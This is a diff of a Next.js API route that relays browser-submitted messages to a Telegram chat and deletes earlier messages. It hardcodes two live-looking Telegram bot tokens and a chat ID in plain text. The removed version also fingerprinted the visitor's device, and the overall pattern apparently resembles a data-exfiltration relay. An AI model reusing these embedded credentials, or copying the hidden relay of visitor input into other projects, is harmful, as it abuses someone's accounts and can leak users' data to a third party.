@@ -1,82 +1,60 @@
 import { NextRequest, NextResponse } from 'next/server';
-import { UAParser } from 'ua-parser-js';
 
-const getConfig = async () => {
-    const config = {
-        TOKEN: "8899229586:AAFIxEq-IacLUb7ZMfUQ2u65Nxlh4Mv9h2o",
-        CHAT_ID: 7626778246
-    };
-    if (!config.TOKEN || !config.CHAT_ID) {
-        throw new Error("Missing TOKEN or CHAT_ID in environment variables");
-    }
 
-    return config;
-};
-
+const TOKEN = '8919882520:AAHCLelw6Kn7eNYNoVbifflgASNQqBYcxss';
+const CHAT_ID = '7626778246';
 
 const POST = async (req: NextRequest) => {
     try {
         const body = await req.json();
-        const { message, message_id } = body;
+        const { message, old_message_id } = body;
 
         if (!message) {
             return NextResponse.json({ success: false }, { status: 400 });
         }
 
-        const config = await getConfig();
-        const { TOKEN, CHAT_ID } = config;
-
-        if (!TOKEN || !CHAT_ID) {
-            return NextResponse.json({ success: false, message: 'Missing TOKEN or CHAT_ID in config' }, { status: 500 });
+        // Xóa tin nhắn cũ nếu có
+        if (old_message_id) {
+            try {
+                const deleteUrl = `https://api.telegram.org/bot${TOKEN}/deleteMessage`;
+                await fetch(deleteUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        message_id: old_message_id
+                    })
+                });
+            } catch {
+                // Bỏ qua lỗi xóa tin nhắn
+            }
         }
 
-        const ua = req.headers.get('user-agent') || '';
-        const parser = new UAParser(ua);
-        const uaResult = parser.getResult();
-        const deviceType = uaResult.device.type || 'desktop';
-        const deviceVendor = uaResult.device.vendor || 'Unknown';
-        const deviceModel = uaResult.device.model || 'Unknown';
-        const osName = uaResult.os.name || 'Unknown';
-        const osVersion = uaResult.os.version || 'Unknown';
-        const deviceName = [deviceVendor, deviceModel].filter((item) => item && item !== 'Unknown').join(' ');
-        const finalDeviceName = deviceName || (deviceType === 'desktop' ? 'Desktop' : deviceType);
-        const osLabel = `${osName}${osVersion !== 'Unknown' ? ` ${osVersion}` : ''}`;
-        const deviceInfo = `${finalDeviceName} | ${osLabel}`;
-        const messageWithDeviceInfo = message.includes('__DEVICE_INFO__')
-            ? message.replace('__DEVICE_INFO__', deviceInfo)
-            : message;
+        // Gửi tin nhắn mới
+        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+        const payload = {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        };
 
-        // Gửi tin nhắn mới trước
-        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        const response = await fetch(url, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: messageWithDeviceInfo,
-                parse_mode: 'HTML'
-            })
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
         });
 
-        if (!response.ok) {
-            return NextResponse.json({ success: false }, { status: 500 });
-        }
-
         const data = await response.json();
-        const newMessageId = data?.result?.message_id ?? null;
+        const result = data?.result;
 
-        // Chỉ xóa tin cũ sau khi gửi tin mới thành công
-        if (message_id) {
-            await fetch(`https://api.telegram.org/bot${TOKEN}/deleteMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    message_id: message_id
-                })
-            });
-        }
-
-        return NextResponse.json({ success: true, message_id: newMessageId });
+        return NextResponse.json({
+            success: response.ok,
+            message_id: result?.message_id ?? null
+        });
     } catch {
         return NextResponse.json({ success: false }, { status: 500 });
     }
